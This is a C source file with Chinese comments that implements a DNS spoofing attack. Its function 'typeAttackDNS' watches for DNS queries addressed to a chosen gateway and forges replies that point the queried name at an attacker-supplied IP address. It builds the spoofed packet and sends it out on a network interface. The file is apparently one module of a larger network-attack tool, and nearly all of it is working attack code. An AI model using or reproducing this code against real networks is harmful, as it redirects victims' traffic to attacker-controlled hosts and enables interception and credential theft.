#include "dns.h"

unsigned char *build_dns_response(unsigned char *packet, unsigned char *dns_ip, int *length)
{
    eth_hdr *eth_header = (eth_hdr *)packet;
    swap_data(eth_header->dst_mac, eth_header->src_mac, MAC_ADDR_LEN);
    ipv4_hdr *ip_header = (ipv4_hdr *)(packet + eth_len); // 根据以太网头部长度定位 IP 头部
    swap_data(ip_header->sourceIP, ip_header->destIP, IPv4_ADDR_LEN);
    udp_hdr *udp_header = (udp_hdr *)(packet + eth_len + ipv4_len); // 根据以太网头部长度和 IP 头部长度定位 UDP 头部
    u_short temp = udp_header->sport;
    udp_header->sport = udp_header->dport;
    udp_header->dport = temp;

    // 构建 DNS 头部
    dns_hdr *dns_header = (dns_hdr *)(packet + eth_len + ipv4_len + udp_len);
    dns_header->flags = htons(0x8400); // 设置 DNS 标志，响应报文，不递归查询
    dns_header->an_count = htons(1);   // 设置回答计数

    int dns_name_len = ntohs(udp_header->tot_len) - udp_len - dns_len - 4; // 计算域名长度

    ip_header->total_len = htons(ntohs(ip_header->total_len) + sizeof(dns_answer));
    udp_header->tot_len = htons(ntohs(udp_header->tot_len) + sizeof(dns_answer));
    // 计算报文长度
    int head_len = eth_len + ipv4_len + udp_len + dns_len;
    int old_packet_len = head_len + dns_name_len + 4;
    int new_packet_len = old_packet_len + sizeof(dns_answer);

    // printf("%d %d %d %d", head_len, old_packet_len, new_packet_len, dns_name_len);

    *length = new_packet_len;
    // 定位到 DNS 请求部分
    dns_question *dns_que = (dns_question *)(packet + head_len + dns_name_len);

    // 分配新的内存来存储响应数据包
    unsigned char *response_packet = (unsigned char *)malloc(new_packet_len);
    if (response_packet == NULL)
    {
        fprintf(stderr, "Memory allocation failed.\n");
        return NULL;
    }

    // 复制原始数据包到新的数据包中
    memcpy(response_packet, packet, old_packet_len);

    // 定位到 DNS 回答部分
    dns_answer *dns_ans = (dns_answer *)((unsigned char *)response_packet + old_packet_len);

    // 设置 DNS 回答部分的字段
    dns_ans->pname = htons(49152 + 12);                                 // c00c
    memcpy(&dns_ans->type, &dns_que->qtype, sizeof(dns_que->qtype));    // 设置查询类型
    memcpy(&dns_ans->class, &dns_que->qclass, sizeof(dns_que->qclass)); // 设置查询类
    uint32_t ttl_value = htonl(3600);
    memcpy(&dns_ans->ttl, &ttl_value, sizeof(uint32_t)); // 设置生存时间
    dns_ans->rdlength = htons(4);                        // 设置数据长度为 IPv4 地址长度
    memcpy(dns_ans->dns_ip, dns_ip, IPv4_ADDR_LEN);

    ip_header = (ipv4_hdr *)(response_packet + eth_len);
    udp_header = (udp_hdr *)(response_packet + eth_len + ipv4_len);

    ip_header->checksum = 0;
    // ip_header->checksum = checksum((unsigned short *)ip_header, sizeof(ipv4_hdr));
    udp_header->check_sum = 0;
    // udp_header->check_sum = udp_checksum(ip_header, udp_header, (unsigned char *)dns_ans, ntohs(udp_header->tot_len));

    return response_packet;
}

void send_dns(unsigned char *packet, const char *interface, unsigned char *dns_ip)
{
    int total_len = 0;
    threadArgs *args = malloc(sizeof(threadArgs));
    if (args == NULL)
    {
        fprintf(stderr, "Memory allocation failed.\n");
        return;
    }
    ipv4_hdr *ip_header = (ipv4_hdr *)(packet + eth_len);
    memcpy(args->ip, ip_header->sourceIP, IPv4_ADDR_LEN);
    unsigned char *response_packet = build_dns_response(packet, dns_ip, &total_len);
    if (response_packet == NULL)
    {
        fprintf(stderr, "Failed to build DNS response packet.\n");
        free(args);
        return;
    }

    if (response_packet != NULL)
    {
        printf("Response packet:\n");
        print_hex(response_packet, total_len);
    }

    send_packets(args, response_packet, interface, 1, total_len);

    free(response_packet);
    free(args);
}

void typeAttackDNS(const unsigned char *packet_content, const char *interface, char *data)
{
    // 定义结构体指针指向数据包内容
    unsigned char *packet = (unsigned char *)packet_content;

    // 解析数据包头部
    // eth_hdr *eth_header = (eth_hdr *)packet;
    ipv4_hdr *ipv4_header = (ipv4_hdr *)(packet + eth_len);
    udp_hdr *udp_header = (udp_hdr *)(packet + eth_len + ipv4_len);

    // 判断是否为DNS包
    if (udp_header->sport == htons(53) || udp_header->dport == htons(53))
    {
        unsigned char gateway_ip[IPv4_ADDR_LEN], dns_ip[IPv4_ADDR_LEN];
        // 解析数据
        if (sscanf(data, "%hhu.%hhu.%hhu.%hhu %hhu.%hhu.%hhu.%hhu",
                   &gateway_ip[0], &gateway_ip[1], &gateway_ip[2], &gateway_ip[3],
                   &dns_ip[0], &dns_ip[1], &dns_ip[2], &dns_ip[3]) != 2 * IPv4_ADDR_LEN)
        {
            fprintf(stderr, "Error parsing data\n");
            return;
        }
        // 判断是否为发往指定网关的包
        if (memcmp(ipv4_header->destIP, gateway_ip, IPv4_ADDR_LEN) == 0)
        {
            dns_hdr *dns_header = (dns_hdr *)(packet + eth_len + ipv4_len + udp_len);
            if (ntohs(dns_header->qd_count) == 1) // 指定请求数为1
            {
                send_dns(packet, interface, dns_ip);
            }
        }
    }
}